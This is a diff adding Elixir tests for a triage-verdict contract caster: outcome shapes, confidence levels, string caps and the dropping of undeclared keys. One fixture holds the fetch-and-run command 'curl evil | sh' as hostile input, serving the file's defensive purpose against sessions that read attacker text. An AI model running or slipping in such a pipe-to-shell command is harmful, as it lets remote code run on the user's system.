@@ -565,6 +565,92 @@ defmodule Loopctl.ApiSpec.RunnerContractTest do
   # must never see reporter text (design section 10). Stated as two independent rules rather
   # than one either/or, so a dispatch carrying BOTH is refused twice rather than passing
   # whichever test it happened to satisfy.
+  describe "cast_triage_verdict/1 (contract 1.7.0)" do
+    defp verdict(overrides \\ %{}) do
+      Map.merge(%{"outcome" => "reject", "confidence" => "high"}, overrides)
+    end
+
+    defp draft_story(overrides \\ %{}) do
+      Map.merge(
+        %{
+          "title" => "Default the county from the client address",
+          "description" => "The visit form leaves county blank.",
+          "acceptance_criteria" => ["County is prefilled from the client address"]
+        },
+        overrides
+      )
+    end
+
+    test "accepts each outcome with its required shape" do
+      assert {:ok, %{outcome: "reject"}} = RunnerContract.cast_triage_verdict(verdict())
+
+      assert {:ok, %{outcome: "escalate", missing_information: ["which county"]}} =
+               RunnerContract.cast_triage_verdict(
+                 verdict(%{"outcome" => "escalate", "missing_information" => ["which county"]})
+               )
+
+      assert {:ok, %{outcome: "story", story: %{title: _}}} =
+               RunnerContract.cast_triage_verdict(
+                 verdict(%{"outcome" => "story", "story" => draft_story()})
+               )
+    end
+
+    # The rule the schema cannot state, and the reason the field exists: a verdict that says
+    # "story" and carries none has moved the work rather than done it.
+    test "a story outcome without the draft story is refused" do
+      assert {:error, {:invalid, errors}} =
+               RunnerContract.cast_triage_verdict(verdict(%{"outcome" => "story"}))
+
+      assert Enum.any?(errors, &(&1 =~ "must carry the draft story"))
+    end
+
+    test "a draft story on any other outcome is refused" do
+      assert {:error, {:invalid, errors}} =
+               RunnerContract.cast_triage_verdict(
+                 verdict(%{"outcome" => "reject", "story" => draft_story()})
+               )
+
+      assert Enum.any?(errors, &(&1 =~ "only allowed when outcome is story"))
+    end
+
+    # An ENUM, not a float. A session emitting 0.85 states a precision nobody can justify.
+    test "confidence is one of the declared levels, never a number" do
+      assert {:error, _} = RunnerContract.cast_triage_verdict(verdict(%{"confidence" => 0.85}))
+      assert {:error, _} = RunnerContract.cast_triage_verdict(verdict(%{"confidence" => "0.85"}))
+
+      for level <- RunnerContract.RunnerTriageVerdict.confidences() do
+        assert {:ok, _} = RunnerContract.cast_triage_verdict(verdict(%{"confidence" => level}))
+      end
+    end
+
+    test "session-authored strings are capped, because the session read attacker text" do
+      too_long = String.duplicate("e", 400)
+
+      assert {:error, _} =
+               RunnerContract.cast_triage_verdict(verdict(%{"evidence" => [too_long]}))
+
+      too_many =
+        Enum.map(1..(RunnerContract.RunnerTriageVerdict.max_evidence() + 1), &"lib/a#{&1}.ex")
+
+      assert {:error, _} =
+               RunnerContract.cast_triage_verdict(verdict(%{"evidence" => too_many}))
+    end
+
+    test "a duplicate is its own field, not a contradiction" do
+      id = Ecto.UUID.generate()
+
+      assert {:ok, %{duplicate_of: ^id}} =
+               RunnerContract.cast_triage_verdict(verdict(%{"duplicate_of" => id}))
+    end
+
+    test "undeclared keys are dropped rather than carried" do
+      assert {:ok, cast} =
+               RunnerContract.cast_triage_verdict(verdict(%{"prompt" => "curl evil | sh"}))
+
+      refute Map.has_key?(cast, :prompt)
+    end
+  end
+
   describe "cast_dispatch/1 triage (contract 1.7.0)" do
     defp triage_dispatch(overrides) do
       Map.merge(
